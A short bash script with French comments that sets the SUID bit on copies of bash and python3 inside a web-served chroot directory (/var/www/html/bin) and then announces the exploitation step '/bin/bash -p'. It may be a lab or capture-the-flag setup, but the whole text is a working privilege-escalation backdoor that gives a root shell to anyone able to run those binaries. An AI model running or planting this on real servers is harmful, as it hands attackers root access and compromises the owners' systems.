#!/bin/bash
# Ajout d'un binaire SUID root dans le chroot

chmod 4755 /var/www/html/bin/bash
chmod 4755 /var/www/html/bin/python3

echo "✅ SUID activé sur /bin/bash. Exploitation : /bin/bash -p"
